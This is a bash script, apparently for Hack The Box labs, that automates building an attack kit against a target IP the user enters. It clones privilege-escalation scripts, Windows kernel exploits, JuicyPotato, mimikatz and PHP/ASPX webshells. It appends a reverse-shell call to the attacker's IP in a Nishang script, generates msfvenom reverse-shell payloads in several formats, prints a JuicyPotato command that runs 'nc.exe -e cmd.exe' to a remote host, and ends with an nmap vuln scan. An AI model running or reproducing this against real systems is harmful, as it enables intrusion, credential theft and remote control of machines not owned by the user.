#!/bin/bash

htbip=`ifconfig tun0 | grep -w "inet" | awk '{print $2}'`
echo "--------------------------------------------"
echo -e "Script Running - \e[41mBecause I'm really lazy.\e[0m"
echo -e "Updated 11.04.2020"
echo -e "\e[0m--------------------------------------------"
echo "Current HTB IP - $htbip"
echo ""
echo "Please input the current box IP"
read  box
echo "Current HTB Box - $box"
mkdir $box
cd $box
mkdir www smb ssh
#echo ""
echo -e "[!]\e[41mInstall Pre-requisites\e[0m[!] - Commented out by Default"
#sudo curl https://sh.rustup.rs -sSf | sh
#cargo install rustscan
#cargo install feroxbuster
#sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
#sudo pipx install git+https://github.com/Tib3rius/AutoRecon.git
echo  -e "[\e[41mCreating One-liners & SSH Keys\e[0m]"
git clone https://github.com/islanddog/notes.git temp && mv temp/useful . && rm -rf temp
sed -i "s/10.0.0.1/$htbip/g" useful
sed -i "s/10.10.10.97/$box/g" useful
cd ssh
ssh-keygen -t rsa -f id_rsa -q -P ""
cd ..
cat ssh/id_rsa.pub
echo ""
echo -e "[\e[41mDownloading Enum Scripts.\e[0m]"
cd www
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries privesc
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite temp
git clone https://github.com/rebootuser/LinEnum temp
cd temp
find ./ -name '*.exe' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.sh' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.bat' -exec cp -prv '{}' '../privesc/' ';'
cd ..
rm -rf temp
cd privesc
rm -rf .git
wget https://gist.githubusercontent.com/islanddog/c77b4567e1569c185d40e2decf02ca63/raw/e9096bbba8d44de315a15cd28b2895ffec1cc6a7/echo-cscript
cd ..
echo ""
echo -e "[\e[41mPulling Windows Exploits\e[0m]"
git clone https://github.com/SecWiki/windows-kernel-exploits.git win-exploits
cd win-exploits && rm -rf .git
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cd ..
mkdir mimikatz
cd mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
unzip mimikatz_trunk.zip && rm -rf mimikatz_trunk.zip
cd ..
echo ""
echo -e "[\e[41mPulling WebShells\e[0m]"
mkdir webshells
git clone https://github.com/ivan-sincek/php-reverse-shell.git tmp
cd tmp
find ./ -name '*.php' -exec cp -prv '{}' '../webshells/' ';'
cd ..
rm -rf tmp
cd webshells
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
echo Invoke-PowerShellTcp -Reverse -IPAddress $htbip -Port 1234 >> Invoke-PowerShellTcp.ps1
wget https://github.com/tennc/webshell/raw/master/aspx/wso.aspx
wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php
wget https://gist.githubusercontent.com/islanddog/f20e0ca0e9cef1d70110a8d781eeaa28/raw/4206911d39aaeed7306b701d5e1cc1d13cb54ffa/uploader.php
cd ..
mkdir shells
cd shells
echo ""
echo -e "[\e[41mCreating MSFVenom Shells\e[0m]"
msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o x86-1234.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o x64-1234.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip LPORT=1234 -f war -o war-1234.war
msfvenom -p windows/shell/reverse_tcp LHOST=$htbip LPORT=1234 -f asp > shell-1234.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip  LPORT=1234 -f raw > shell-1234.jsp
cd ..
cd ..
echo ""
echo -e "[\e[41mManual Download Required for Updates\e[0m]"
echo ""
echo "MimiKatz"
echo "https://github.com/gentilkiwi/mimikatz/releases/"
echo ""
echo "JuicyPotato"
echo "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
echo "JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a /c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443 -t *"
echo ""
echo "Default Port is 1234"
echo "Setup Complete"
cd ..
#Have RustScan automatically scan the HTB VM
rustscan --ulimit 5000 $box -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html